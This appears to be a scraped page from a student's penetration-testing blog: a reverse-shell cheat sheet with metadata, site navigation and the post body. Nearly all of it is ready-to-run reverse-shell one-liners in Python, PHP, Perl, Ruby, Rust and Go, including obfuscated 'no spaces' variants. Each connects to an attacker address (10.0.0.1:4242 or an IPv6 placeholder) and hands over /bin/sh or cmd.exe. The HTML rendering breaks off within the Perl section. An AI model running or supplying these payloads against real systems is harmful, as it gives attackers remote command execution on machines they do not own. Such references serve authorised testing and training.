'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")' python -c 'a=__import__;b=a(\"socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])' python -c 'a=__import__;b=a(\"socket\");c=a(\"subprocess\").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())' IPv4 (No Spaces, Shortened Further) python -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")' python -c 'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])' python -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())' IPv6 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' IPv6 (No Spaces) python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' IPv6 (No Spaces, Shortened) python -c 'a=__import__;c=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")' Windows only (Python2) python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) \u003e 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\" Windows only (Python3) python.exe -c \"import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\\\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\\\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\\\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\\\",globals())).start()\" PHP php -r '$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' php -r '$sock=fsockopen(\"10.0.0.1\",4242);shell_exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' php -r '$sock=fsockopen(\"10.0.0.1\",4242);`/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263`;' php -r '$sock=fsockopen(\"10.0.0.1\",4242);system(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' php -r '$sock=fsockopen(\"10.0.0.1\",4242);passthru(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' php -r '$sock=fsockopen(\"10.0.0.1\",4242);popen(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\", \"r\");' php -r '$sock=fsockopen(\"10.0.0.1\",4242);$proc=proc_open(\"/bin/sh -i\", array(0=\u003e$sock, 1=\u003e$sock, 2=\u003e$sock),$pipes);' Perl perl -e 'use Socket;$i=\"10.0.0.1\";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"/bin/sh -i\");};' perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4242\");STDIN-\u003efdopen($c,r);$~-\u003efdopen($c,w);system$_ while\u003c\u003e;' NOTE: Windows only perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4242\");STDIN-\u003efdopen($c,r);$~-\u003efdopen($c,w);system$_ while\u003c\u003e;' Ruby ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4242).to_i;exec sprintf(\"/bin/sh -i \u003c\u0026%d \u003e\u0026%d 2\u003e\u0026%d\",f,f,f)' ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"10.0.0.1\",\"4242\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}' NOTE: Windows only ruby -rsocket -e 'c=TCPSocket.new(\"10.0.0.1\",\"4242\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' Rust use std::net::TcpStream; use std::os::unix::io::{AsRawFd, FromRawFd}; use std::process::{Command, Stdio}; fn main() { let s = TcpStream::connect(\"10.0.0.1:4242\").unwrap(); let fd = s.as_raw_fd(); Command::new(\"/bin/sh\") .arg(\"-i\") .stdin(unsafe { Stdio::from_raw_fd(fd) }) .stdout(unsafe { Stdio::from_raw_fd(fd) }) .stderr(unsafe { Stdio::from_raw_fd(fd) }) .spawn() .unwrap() .wait() .unwrap(); } Golang echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"10.0.0.1:4242\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' \u003e /tmp/t.go \u0026\u0026 go run /tmp/t.go \u0026\u0026 rm /tmp/t.go Resources: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet\n",
  "wordCount" : "451",
  "inLanguage": "en",
  "datePublished": "2026-01-13T00:00:00Z",
  "dateModified": "2026-01-13T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/posts/penetration-testing/webvulnerability/python_revshell/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Gajendra Mahato",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.jpg"
    }
  }
}
</script>
  <style>
    @media screen and (max-width: 768px) {
      .mobile-header {
        display: flex;
        align-items: center;
      }
    }

    .mobile-avatar {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      margin-right: 10px;
      object-fit: cover;
    }

    .mobile-avatar-link {
      line-height: 0;
    }
  </style>
</head>

<body class="sidebar-layout">
  <div class="container">
    <header class="mobile-header">
      <button class="mobile-menu-btn"><i class="fas fa-bars"></i></button>
      <a href="http://localhost:1313/" class="mobile-avatar-link">
        <img src="http://localhost:1313/images/avatar.jpg" alt="Avatar Image" class="mobile-avatar">
      </a>
      <a href="http://localhost:1313/">
        <div>Gajendra Mahato</div>
      </a>
      <button class="mobile-search-btn"><i class="fas fa-search"></i>
      </button>
    </header>

    
    <aside class="sidebar">
      <button class="mobile-close-btn">
        <i class="fa-solid fa-xmark"></i>
      </button>
      <div class="sidebar-header">
        <a href="http://localhost:1313/" class="avatar-link"><img src="http://localhost:1313/images/avatar.jpg"
            alt="Avatar Image"></a>
        <a href="http://localhost:1313/">
          <div class="name-title">Gajendra Mahato</div>
        </a>
        <p>Computer Science Student</p>
      </div>


      <nav class="sidebar-nav">
        
        <a href="/" class="">
          <span class="icon-container"><i class='fa-solid fa-house'></i></span> Home
        </a>
        
        <a href="/about/" class="">
          <span class="icon-container"><i class='fa-solid fa-user'></i></span> About Me
        </a>
        
        <a href="/posts/" class="">
          <span class="icon-container"><i class='fa-solid fa-pen-nib'></i></span> Writeups
        </a>
        
        <a href="/portfolio/" class="">
          <span class="icon-container"><i class='fa-solid fa-briefcase'></i></span> Portfolio
        </a>
        
        <a href="/posts/tipsandtricks/cheatsheets/" class="">
          <span class="icon-container"><i class='fa-solid fa-book'></i></span> Cheatsheet
        </a>
        
        <a href="/contact/" class="">
          <span class="icon-container"><i class='fa-solid fa-envelope'></i></span> Contact
        </a>
        
      </nav>

      <div class="sidebar-footer">
        <a href="https://github.com/NoobGajen" target="_blank"><i class="fab fa-github"></i></a>
        <a href="https://www.linkedin.com/in/GajendraMahato" target="_blank"><i class="fab fa-linkedin"></i></a>
        <a href="https://x.com/NoobGajen" target="_blank"><i class="fab fa-twitter"></i></a>
        <a href="https://tryhackme.com/p/TheLinuxLover" target="_blank"><i class="fas fa-user-secret"></i></i></a>
        <a href="http://localhost:1313/index.xml" target="_blank">
          <i class="fa-solid fa-rss"></i>
        </a>
      </div>
    </aside>

    
    <main class="content">
      <header class="topnav">
        <div id="search-container" class="search-container">
          <span class="absolute left-3 top-2.5 text-gray-400">
            <i class="fas fa-search"></i>
          </span>
          <input id="search-input" type="text" placeholder="Search..."
            class="w-full border rounded-lg py-2 pl-10 pr-4 focus:outline-none focus:ring-2 focus:ring-blue-500" />
        </div>
      </header>
      <div class="content-container">
        <div class="inside">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;&nbsp;<a href="http://localhost:1313/posts/">Posts</a>&nbsp;&nbsp;<a href="http://localhost:1313/posts/penetration-testing/">Penetration Testing</a>&nbsp;&nbsp;<a href="http://localhost:1313/posts/penetration-testing/webvulnerability/">Web Vulnerability</a></div>
    <h1 class="post-title entry-hint-parent">
      Python (Linux only)
    </h1>
    <div class="post-meta"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;&nbsp;<span>3 min</span>

</div>
  </header> 
  <div class="post-content"><h2 id="reverse-shell">Reverse Shell<a hidden class="anchor" aria-hidden="true" href="#reverse-shell">#</a></h2>
<h2 id="ipv4">IPv4<a hidden class="anchor" aria-hidden="true" href="#ipv4">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">export</span> <span class="n">RHOST</span><span class="o">=</span><span class="s2">&#34;10.0.0.1&#34;</span><span class="p">;</span><span class="n">export</span> <span class="n">RPORT</span><span class="o">=</span><span class="mi">4242</span><span class="p">;</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#39;</span>
</span></span></code></pre></div><h2 id="ipv4-no-spaces">IPv4 (No Spaces)<a hidden class="anchor" aria-hidden="true" href="#ipv4-no-spaces">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;socket=__import__(&#34;socket&#34;);os=__import__(&#34;os&#34;);pty=__import__(&#34;pty&#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;socket=__import__(&#34;socket&#34;);subprocess=__import__(&#34;subprocess&#34;);os=__import__(&#34;os&#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;socket=__import__(&#34;socket&#34;);subprocess=__import__(&#34;subprocess&#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#39;</span>
</span></span></code></pre></div><h2 id="ipv4-no-spaces-shortened">IPv4 (No Spaces, Shortened)<a hidden class="anchor" aria-hidden="true" href="#ipv4-no-spaces-shortened">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;a=__import__;s=a(&#34;socket&#34;);o=a(&#34;os&#34;).dup2;p=a(&#34;pty&#34;).spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((&#34;10.0.0.1&#34;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&#34;/bin/sh&#34;)&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;a=__import__;b=a(&#34;socket&#34;);p=a(&#34;subprocess&#34;).call;o=a(&#34;os&#34;).dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;a=__import__;b=a(&#34;socket&#34;);c=a(&#34;subprocess&#34;).call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;c([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=f(),stdout=f(),stderr=f())&#39;</span>
</span></span></code></pre></div><h2 id="ipv4-no-spaces-shortened-further">IPv4 (No Spaces, Shortened Further)<a hidden class="anchor" aria-hidden="true" href="#ipv4-no-spaces-shortened-further">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;a=__import__;s=a(&#34;socket&#34;).socket;o=a(&#34;os&#34;).dup2;p=a(&#34;pty&#34;).spawn;c=s();c.connect((&#34;10.0.0.1&#34;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&#34;/bin/sh&#34;)&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;a=__import__;b=a(&#34;socket&#34;).socket;p=a(&#34;subprocess&#34;).call;o=a(&#34;os&#34;).dup2;s=b();s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;a=__import__;b=a(&#34;socket&#34;).socket;c=a(&#34;subprocess&#34;).call;s=b();s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;c([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=f(),stdout=f(),stderr=f())&#39;</span>
</span></span></code></pre></div><h2 id="ipv6">IPv6<a hidden class="anchor" aria-hidden="true" href="#ipv6">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
</span></span></code></pre></div><h2 id="ipv6-no-spaces">IPv6 (No Spaces)<a hidden class="anchor" aria-hidden="true" href="#ipv6-no-spaces">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;socket=__import__(&#34;socket&#34;);os=__import__(&#34;os&#34;);pty=__import__(&#34;pty&#34;);s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
</span></span></code></pre></div><h2 id="ipv6-no-spaces-shortened">IPv6 (No Spaces, Shortened)<a hidden class="anchor" aria-hidden="true" href="#ipv6-no-spaces-shortened">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;a=__import__;c=a(&#34;socket&#34;);o=a(&#34;os&#34;).dup2;p=a(&#34;pty&#34;).spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(&#34;/bin/sh&#34;)&#39;</span>
</span></span></code></pre></div><h2 id="windows-only-python2">Windows only (Python2)<a hidden class="anchor" aria-hidden="true" href="#windows-only-python2">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;10.0.0.1&#39;, 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&#39;try&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;</span><span class="se">\\</span><span class="s2">windows</span><span class="se">\\</span><span class="s2">system32</span><span class="se">\\</span><span class="s2">cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])(</span><span class="si">{}</span><span class="s2">), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])(</span><span class="si">{}</span><span class="s2">), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&#34;</span>
</span></span></code></pre></div><h2 id="windows-only-python3">Windows only (Python3)<a hidden class="anchor" aria-hidden="true" href="#windows-only-python3">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;import socket,os,threading,subprocess as sp;p=sp.Popen([&#39;cmd.exe&#39;],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((&#39;10.0.0.1&#39;,4242));threading.Thread(target=exec,args=(</span><span class="se">\&#34;</span><span class="s2">while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)</span><span class="se">\&#34;</span><span class="s2">,globals()),daemon=True).start();threading.Thread(target=exec,args=(</span><span class="se">\&#34;</span><span class="s2">while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)</span><span class="se">\&#34;</span><span class="s2">,globals())).start()&#34;</span>
</span></span></code></pre></div><h1 id="php">PHP<a hidden class="anchor" aria-hidden="true" href="#php">#</a></h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);shell_exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);system(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);passthru(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);popen(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;, &#34;r&#34;);&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">php -r <span class="s1">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;</span>
</span></span></code></pre></div><h1 id="perl">Perl<a hidden class="anchor" aria-hidden="true" href="#perl">#</a></h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">perl</span> <span class="o">-</span><span class="n">MIO</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;10.0.0.1:4242&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">NOTE:</span> <span class="n">Windows</span> <span class="n">only</span>
